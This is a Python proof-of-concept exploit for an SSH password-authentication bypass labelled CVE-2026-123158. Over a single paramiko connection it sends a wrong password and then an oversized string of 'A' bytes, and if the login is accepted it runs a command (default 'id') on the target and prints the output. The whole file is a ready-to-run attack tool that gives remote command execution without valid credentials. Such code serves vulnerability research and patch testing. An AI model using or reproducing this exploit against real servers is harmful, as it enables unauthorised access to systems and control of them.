#!/usr/bin/env python3
"""
CVE-2026-123158 ("*sshole") PoC.

Exit: 0 = bypass confirmed, 1 = rejected, 2 = network/protocol error.
"""
import argparse, socket, sys
import paramiko


def run(host, port, user, n, literal, cmd="id", timeout=15):
    payload = literal if literal is not None else "A" * n
    kind = "literal" if literal is not None else "of 'A'"
    print(f"[*] target {host}:{port}  user {user}")
    print(f"[*] two attempts on one connection: primer, then {len(payload)} bytes {kind}")

    sock = socket.create_connection((host, port), timeout=timeout)
    t = paramiko.Transport(sock)
    t.start_client(timeout=timeout)
    print(f"    server banner: {t.remote_version}")

    try:
        for i, pw in enumerate(("wrong", payload), start=1):
            try:
                t.auth_password(user, pw)
            except paramiko.AuthenticationException:
                print(f"    attempt {i}: len={len(pw):<5} REJECTED")
                continue

            print(f"    attempt {i}: len={len(pw):<5} ACCEPTED  <-- bypass")
            if cmd:
                ch = t.open_session()
                ch.exec_command(cmd)
                out = ch.makefile().read().decode(errors="replace").strip()
                print(f"\n    $ {cmd}\n    {out}")
            return 0
        return 1
    finally:
        t.close()


def main():
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("port", type=int)
    p.add_argument("user")
    p.add_argument("-n", type=int, default=300,
                   help="payload length in bytes, all 'A' (default 300; window is 257-1024)")
    p.add_argument("-P", "--password", default=None,
                   help="send this literal password instead of n*'A'")
    p.add_argument("-c", "--cmd", default="id")
    a = p.parse_args()
    try:
        rc = run(a.host, a.port, a.user, a.n, a.password, a.cmd)
    except (socket.timeout, OSError) as e:
        print(f"    network error: {e}")
        return 2
    print("\n    RESULT:", "ACCEPTED" if rc == 0 else "REJECTED")
    return rc


if __name__ == "__main__":
    sys.exit(main())